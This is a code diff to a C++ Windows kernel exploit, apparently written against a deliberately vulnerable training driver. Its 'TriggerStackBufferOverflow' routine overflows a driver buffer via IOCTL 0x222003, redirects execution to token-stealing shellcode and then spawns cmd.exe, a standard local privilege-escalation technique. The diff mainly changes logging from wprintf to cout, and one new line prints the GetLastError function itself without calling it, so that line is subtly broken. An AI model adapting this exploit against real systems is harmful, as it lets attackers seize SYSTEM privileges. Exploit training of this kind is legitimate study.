@@ -1,7 +1,11 @@
+#include <Windows.h>
+#include <iostream>
+
 #include "Solutions.h"
 #include "ioctal_codes.h"
 #include "utils.h"
-#include <stdio.h>
+
+using namespace std;
 
 NTSTATUS Solutions::TriggerStackBufferOverflow() {
 	DWORD dwBufSize = 0x820 + sizeof(DWORD);
@@ -9,12 +13,12 @@ NTSTATUS Solutions::TriggerStackBufferOverflow() {
 	DWORD dwIoctl = IOCTL_STACK_OVERFLOW;
 	DWORD dwBytesReturned = 0;
 
-	wprintf(L"[+] Device Handle 0x%x\n", _hDeviceHandle);
+	cout << "[+] Device Handle " << hex << _hDeviceHandle << endl;
 
 	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);
 
 	if (!lpInBuffer) {
-		wprintf(L"[!] Failed to allocate memory. %x\n", GetLastError());
+		cout << "[!] Failed to allocate memory - " << GetLastError() << endl;
 		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
 		return 1;
 	}
@@ -26,21 +30,21 @@ NTSTATUS Solutions::TriggerStackBufferOverflow() {
 	lpInBuffer[0x822] = ((DWORD)&tokenStealingShellcode & 0xFF0000) >> 16;
 	lpInBuffer[0x823] = ((DWORD)&tokenStealingShellcode & 0xFF000000) >> 24;
 
-	wprintf(L"[+] Sending IOCTL request with ioctl: 0x222003\n");
-	wprintf(L"[+] Buffer size: 0x%x\n", dwBufSize);
-	wprintf(L"[+] Jumping to shellcode 0x%x\n", (DWORD)&tokenStealingShellcode);
+	cout << "[+] Sending IOCTL request with ioctl: 0x222003" << endl;
+	cout << "[+] Buffer size: " << dwBufSize << endl;
+	cout << "[+] Jumping to shellcode " << hex << (DWORD)&tokenStealingShellcode << endl;
 
 	if (!DeviceIoControl(_hDeviceHandle,
 		dwIoctl,
 		(LPVOID)lpInBuffer,
 		dwBufSize, NULL, 0, &dwBytesReturned, NULL))
 	{
-		wprintf(L"[-] ERROR: %d - could not talk with the driver\n", GetLastError());
+		cout << "[-] ERROR: " << GetLastError << " - could not talk with the driver" << endl;
 		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
 		return 1;
 	}
 
-	wprintf(L"[+] Talked succesfully with the driver\n");
+	cout << "[+] Talked succesfully with the driver" << endl;
 
 	system("cmd.exe");
 
